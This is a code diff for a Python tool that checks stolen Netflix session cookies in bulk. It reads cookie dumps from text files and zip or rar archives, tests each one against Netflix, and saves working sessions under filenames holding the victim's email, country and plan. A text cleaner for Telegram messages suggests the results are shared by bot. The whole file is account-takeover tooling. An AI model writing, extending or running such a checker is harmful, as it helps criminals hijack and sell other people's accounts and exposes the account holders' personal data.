@@ -7,7 +7,7 @@ import shutil
 import uuid
 import zipfile
 import threading
-from concurrent.futures import ProcessPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from http.cookies import SimpleCookie
 from bs4 import BeautifulSoup
 import hashlib
@@ -31,6 +31,29 @@ temp_results_dir = None
 def log(text):
     """Simple logging function for console output"""
     print(text)
+
+# --- Function to sanitize text for Telegram messages ---
+def sanitize_for_telegram(text):
+    """Remove or escape characters that cause Telegram entity parsing issues"""
+    if not text:
+        return "N/A"
+    
+    # Replace problematic characters
+    text = str(text)
+    text = text.replace('&', 'and')
+    text = text.replace('<', '(')
+    text = text.replace('>', ')')
+    text = text.replace('[', '(')
+    text = text.replace(']', ')')
+    text = text.replace('*', '-')
+    text = text.replace('_', '-')
+    text = text.replace('`', "'")
+    text = text.replace('|', '-')
+    
+    # Remove any control characters
+    text = ''.join(char for char in text if ord(char) >= 32 or char in '\n\r\t')
+    
+    return text.strip() if text.strip() else "N/A"
 
 # --- NEW: Function to scan the output folder for existing emails ---
 def get_emails_from_folder(folder_path):
@@ -62,7 +85,8 @@ def extract_netflix_plan(html_content: str) -> str:
     # --- Attempt 1: Primary Method (Fast but specific string splitting) ---
     try:
         plan = html_content.split('data-uia="plan-label"><b>')[1].split('</b>')[0]
-        if plan: return plan.strip()
+        if plan: 
+            return sanitize_for_telegram(plan.strip())
     except IndexError:
         pass
 
@@ -71,11 +95,11 @@ def extract_netflix_plan(html_content: str) -> str:
         soup = BeautifulSoup(html_content, "html.parser")
         h3_tag = soup.find('h3', class_='default-ltr-cache-10ajupv e19xx6v32')
         if h3_tag and h3_tag.text:
-            return h3_tag.text.strip()
+            return sanitize_for_telegram(h3_tag.text.strip())
         
         h3_tag_robust = soup.find('h3', class_=lambda c: c and 'card+title' in c)
         if h3_tag_robust and h3_tag_robust.text:
-            return h3_tag_robust.get_text(strip=True)
+            return sanitize_for_telegram(h3_tag_robust.get_text(strip=True))
 
     except Exception:
         pass
@@ -83,11 +107,12 @@ def extract_netflix_plan(html_content: str) -> str:
     # --- Attempt 3: Final String Splitting Fallback ---
     try:
         plan = html_content.split('<div class="account-section-item" data-uia="plan-label">')[1].split("</p><p>")[0].split('<p class="beneficiary-header">')[1].replace(":", "")
-        if plan: return plan.strip()
+        if plan: 
+            return sanitize_for_telegram(plan.strip())
     except IndexError:
         pass
 
-    return plan if plan != "Unknown" else "NULL"
+    return sanitize_for_telegram(plan if plan != "Unknown" else "NULL")
 
 # --- Main Checker Class with Revised Logic ---
 class NetflixCookieChecker:
@@ -107,7 +132,7 @@ class NetflixCookieChecker:
             response = requests.get("https://www.netflix.com/account/security", headers=headers, cookies=cookies, timeout=10)
             pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b'
             matches = re.findall(pattern, response.text)
-            return matches[0] if matches else None
+            return sanitize_for_telegram(matches[0]) if matches else None
         except Exception:
             return None
             
@@ -139,8 +164,9 @@ class NetflixCookieChecker:
                     email = react_context.get('models', {}).get('memberContext', {}).get('data', {}).get('email', 'N/A')
                 if email == 'N/A': raise AttributeError
             except (AttributeError, json.JSONDecodeError, KeyError):
+                log("Primary email extraction failed, using fallback.")
                 email = self.get_email_from_security_page(headers, cookie_dict) or 'N/A'
-            info['email'] = email
+            info['email'] = sanitize_for_telegram(email)
             
             # --- Plan Extraction using the new dedicated function ---
             info['plan'] = extract_netflix_plan(html)
@@ -148,7 +174,7 @@ class NetflixCookieChecker:
             # --- Extract Country ---
             try:
                 country_code = re.search(r'"currentCountry":"([^"]+)"', html).group(1)
-                info['country'] = self.get_country_name(country_code)
+                info['country'] = sanitize_for_telegram(self.get_country_name(country_code))
             except AttributeError:
                 info['country'] = 'N/A'
 
@@ -158,82 +184,11 @@ class NetflixCookieChecker:
             return True, info
 
         except requests.RequestException as e:
+            log(f"Login valid, but failed to get account details: {e}")
             return True, info
-# --- NEW: Worker function for ProcessPoolExecutor ---
-def worker_process_single_cookie(args):
-    """Worker function to process one cookie dictionary in a separate process."""
-    cookie_dict, source_filename, temp_results_dir = args
-    
-    # Create checker instance in this process
-    checker = NetflixCookieChecker()
-    
-    try:
-        is_valid, info = checker.validate_and_get_info(cookie_dict)
-        
-        if is_valid:
-            email = info.get('email', 'N/A')
-            
-            # Create filename for valid cookie
-            filename = (
-                f"[{info.get('country', 'N/A')}]"
-                f"[{info.get('email', 'N/A')}]"
-                f"[{info.get('plan', 'NULL')}]"
-                f"[{info.get('extra_member', 'false')}].txt"
-            )
-            filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
-            
-            # Save valid cookie
-            valid_dir = os.path.join(temp_results_dir, 'valid_cookies')
-            os.makedirs(valid_dir, exist_ok=True)
-            output_path = os.path.join(valid_dir, filename)
-            
-            payload = []
-            for name, value in cookie_dict.items():
-                secure = name in SECURE_HTTPONLY_NAMES
-                http_only = name in SECURE_HTTPONLY_NAMES
-                payload.append({
-                    "name": name, "value": value, "domain": ".netflix.com", 
-                    "path": "/", "secure": secure, "httpOnly": http_only
-                })
 
-            with open(output_path, 'w', encoding='utf-8') as f:
-                json.dump(payload, f, ensure_ascii=False, separators=(',', ': '))
-            
-            return ("valid", email, info, os.path.basename(output_path))
-        else:
-            error_msg = info.get('error', 'Unknown error')
-            
-            # Save invalid cookie
-            filename = os.path.basename(source_filename)
-            filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
-            
-            invalid_dir = os.path.join(temp_results_dir, 'invalid_cookies')
-            os.makedirs(invalid_dir, exist_ok=True)
-            output_path = os.path.join(invalid_dir, filename)
-
-            payload = []
-            for name, value in cookie_dict.items():
-                secure = name in SECURE_HTTPONLY_NAMES
-                http_only = name in SECURE_HTTPONLY_NAMES
-                payload.append({
-                    "name": name, "value": value, "domain": ".netflix.com", 
-                    "path": "/", "secure": secure, "httpOnly": http_only
-                })
-            
-            # Add the error message to the saved JSON for context
-            invalid_data = {
-                "error": error_msg,
-                "source_file": os.path.basename(source_filename),
-                "cookie_data": payload
-            }
-
-            with open(output_path, 'w', encoding='utf-8') as f:
-                json.dump(invalid_data, f, ensure_ascii=False, indent=4)
-            
-            return ("invalid", error_msg, source_filename)
-            
-    except Exception as e:
-        return ("error", str(e), source_filename)
+# --- Initialize Checker ---
+netflix_checker = NetflixCookieChecker()
 
 # --- Cookie Parsing Functions ---
 def _parse_cookie_header_format(cookie_str: str):
@@ -289,23 +244,122 @@ def parse_input_to_cookie_list(file_content: str):
     else:
         log("No specific format detected, attempting simple Key=Value parsing.")
         return [d for d in (parse_cookie_line(line) for line in lines) if d]
-# --- REVISED: run_check_on_file_list using ProcessPoolExecutor ---
+
+def _save_valid_cookie_with_info(cookie_dict, info):
+    global temp_results_dir
+    # Sanitize filename components
+    country = sanitize_for_telegram(info.get('country', 'N/A'))
+    email = sanitize_for_telegram(info.get('email', 'N/A'))
+    plan = sanitize_for_telegram(info.get('plan', 'NULL'))
+    extra_member = sanitize_for_telegram(info.get('extra_member', 'false'))
+    
+    filename = f"[{country}][{email}][{plan}][{extra_member}].txt"
+    filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
+    
+    # Use temp directory instead of fixed directory
+    valid_dir = os.path.join(temp_results_dir, 'valid_cookies')
+    os.makedirs(valid_dir, exist_ok=True)
+    output_path = os.path.join(valid_dir, filename)
+    
+    payload = []
+    for name, value in cookie_dict.items():
+        secure = name in SECURE_HTTPONLY_NAMES
+        http_only = name in SECURE_HTTPONLY_NAMES
+        payload.append({"name": name, "value": value, "domain": ".netflix.com", "path": "/", "secure": secure, "httpOnly": http_only})
+
+    with open(output_path, 'w', encoding='utf-8') as f:
+        json.dump(payload, f, ensure_ascii=False, separators=(',', ': '))
+    
+    return output_path
+
+def _save_invalid_cookie(cookie_dict, error_message, source_filename="unknown_source", original_content=""):
+    """
+    Saves an invalid cookie to the invalid_cookies directory in temp folder.
+    Keeps the original format and filename unchanged.
+    """
+    global temp_results_dir
+    # Get just the base filename (e.g., "1.txt" from "/path/to/1.txt")
+    filename = os.path.basename(source_filename)
+    
+    # Sanitize the filename to be safe for file paths
+    filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
+    
+    invalid_dir = os.path.join(temp_results_dir, 'invalid_cookies')
+    os.makedirs(invalid_dir, exist_ok=True)
+    output_path = os.path.join(invalid_dir, filename)
+
+    # If we have original content, use it; otherwise create from cookie_dict
+    if original_content:
+        # Save the original content as-is
+        with open(output_path, 'w', encoding='utf-8') as f:
+            f.write(original_content)
+    else:
+        # Fallback: create simple cookie format
+        with open(output_path, 'w', encoding='utf-8') as f:
+            for name, value in cookie_dict.items():
+                f.write(f"{name}={value};\n")
+    
+    return output_path
+
+def process_single_cookie(cookie_dict, total_cookies, source_filename="unknown_source", original_content=""):
+    """Worker function to process one cookie dictionary."""
+    global valid_count, invalid_count, checked_count
+    if stop_flag:
+        return
+
+    is_valid, info = netflix_checker.validate_and_get_info(cookie_dict)
+    
+    with check_lock:
+        checked_count += 1
+        if is_valid:
+            email = info.get('email', 'N/A')
+            
+            # Check if the account was already saved in this run or from a previous run
+            if email != 'N/A' and email in saved_emails:
+                # This is an existing account, so we are updating it.
+                path = _save_valid_cookie_with_info(cookie_dict, info)
+                log(f"🔄 UPDATED: Refreshed cookie for {email}")
+            else:
+                # This is a brand new valid account.
+                valid_count += 1
+                if email != 'N/A':
+                    saved_emails.add(email)
+                
+                path = _save_valid_cookie_with_info(cookie_dict, info)
+                log(f"💾 NEW: {os.path.basename(path)}")
+        else:
+            invalid_count += 1
+            error_msg = info.get('error', 'Unknown error')
+            # Save invalid cookie with original content
+            _save_invalid_cookie(cookie_dict, error_msg, source_filename, original_content) 
+            log(f"❌ INVALID: {error_msg} (from {os.path.basename(source_filename)})")
+
+        # Update progress
+        progress = checked_count / total_cookies
+        log(f'Progress: {checked_count}/{total_cookies} | Valid: {valid_count} | Invalid: {invalid_count}')
+
+# --- Store original content for invalid cookies ---
+original_file_contents = {}
+
+# --- REVISED: run_check_on_file_list supports live yields ---
 def run_check_on_file_list(file_paths, live=False):
     """
-    Reads a list of .txt files, parses all cookies, and then runs the checker using ProcessPoolExecutor.
+    Reads a list of .txt files, parses all cookies, and then runs the checker.
     This is the main orchestrator for the checking process.
     """
-    global temp_results_dir, stop_flag
+    global temp_results_dir, stop_flag, valid_count, invalid_count, checked_count, saved_emails, original_file_contents
     
     # Initialize counters
     stop_flag = False
     valid_count, invalid_count, checked_count = 0, 0, 0
     saved_emails = set()
+    original_file_contents = {}
     
     # Create temporary directory for results
     temp_results_dir = f"temp_results_{uuid.uuid4().hex}"
     os.makedirs(temp_results_dir, exist_ok=True)
     
+    all_cookies_to_check = []
     cookies_with_sources = [] 
 
     for file_path in file_paths:
@@ -317,11 +371,14 @@ def run_check_on_file_list(file_paths, live=False):
             with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                 content = f.read()
             
+            # Store original content for this file
+            original_file_contents[file_path] = content
+            
             cookies_from_file = parse_input_to_cookie_list(content)
             if cookies_from_file:
                 log(f"  -> Found {len(cookies_from_file)} cookie(s) in this file.")
                 for cookie_dict in cookies_from_file:
-                    cookies_with_sources.append((cookie_dict, file_path, temp_results_dir))
+                    cookies_with_sources.append((cookie_dict, file_path))
             else:
                 log(f"  -> No valid cookie formats found in this file.")
 
@@ -339,49 +396,24 @@ def run_check_on_file_list(file_paths, live=False):
     log(f'Found a total of {total_to_check} cookies to check across all files.')
 
     try:
-        # Use ProcessPoolExecutor with max_workers processes
-        with ProcessPoolExecutor(max_workers=5) as executor:
-            futures = {executor.submit(worker_process_single_cookie, args): args 
-                      for args in cookies_with_sources}
-            
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = {
+                executor.submit(
+                    process_single_cookie, 
+                    c_dict, 
+                    total_to_check, 
+                    s_path, 
+                    original_file_contents.get(s_path, "")
+                ): (c_dict, s_path) 
+                for c_dict, s_path in cookies_with_sources
+            }
             for future in as_completed(futures):
                 if stop_flag:
                     executor.shutdown(wait=False, cancel_futures=True)
                     break
-                
-                try:
-                    result = future.result()
-                    checked_count += 1
-                    
-                    if result[0] == "valid":
-                        valid_count += 1
-                        email = result[1]
-                        if email != 'N/A':
-                            if email in saved_emails:
-                                log(f"🔄 UPDATED: Refreshed cookie for {email}")
-                            else:
-                                saved_emails.add(email)
-                                log(f"💾 NEW: {result[3]}")
-                        else:
-                            log(f"💾 NEW: {result[3]}")
-                    elif result[0] == "invalid":
-                        invalid_count += 1
-                        log(f"❌ INVALID: {result[1]} (from {os.path.basename(result[2])})")
-                    else:  # error
-                        invalid_count += 1
-                        log(f"❌ ERROR: {result[1]} (from {os.path.basename(result[2])})")
-                    
-                    # Update progress
-                    progress = checked_count / total_to_check
-                    log(f'Progress: {checked_count}/{total_to_check} | Valid: {valid_count} | Invalid: {invalid_count}')
-                    
-                    if live:
-                        yield (checked_count, total_to_check, valid_count, invalid_count)
-                        
-                except Exception as e:
-                    log(f"Error processing result: {e}")
-                    invalid_count += 1
-                    checked_count += 1
+                future.result()
+                if live:
+                    yield (checked_count, total_to_check, valid_count, invalid_count)
 
         if stop_flag:
             log('⏹️ Checking stopped by user.')
@@ -427,7 +459,7 @@ def process_file_and_check(input_file, live=False):
         elif file_ext == '.rar':
             log(f"📦 RAR archive detected. Extracting...")
             try:
-                rarfile.UNRAR_TOOL = "UnRAR.exe"
+                rarfile.UNRAR_TOOL = "/usr/bin/unrar"
                 os.makedirs(extract_dir, exist_ok=True)
                 with rarfile.RarFile(input_file, 'r') as rar_ref:
                     rar_ref.extractall(extract_dir)
@@ -444,6 +476,7 @@ def process_file_and_check(input_file, live=False):
             if live:
                 yield (0, 0, 0, 0, None)
             return None
+
         if not txt_file_paths:
             log("❌ No .txt files found to process.")
             if live:
@@ -451,15 +484,11 @@ def process_file_and_check(input_file, live=False):
             return None
         
         log(f"Found {len(txt_file_paths)} .txt file(s) to process.")
-        
-        # Call the revised run_check_on_file_list function
+        results = run_check_on_file_list(txt_file_paths, live=live)
         if live:
-            # Generator mode - yield results as they come
-            for result in run_check_on_file_list(txt_file_paths, live=True):
-                yield result
+            yield from results
         else:
-            # Non-generator mode - return final result
-            return run_check_on_file_list(txt_file_paths, live=False)
+            return results
 
     finally:
         # Clean up extraction directory
@@ -476,14 +505,10 @@ def main(file_paths):
     results_dir = process_file_and_check(file_paths[0])
     return results_dir
 
-# --- For multiprocessing support on Windows ---
 if __name__ == "__main__":
-    # This is required for ProcessPoolExecutor on Windows
-    import multiprocessing
-    multiprocessing.freeze_support()
-    
     # Test with local file
     test_files = ["test_cookies.txt"]
     results = main(test_files)
     if results:
         print(f"Results saved to: {results}")
+
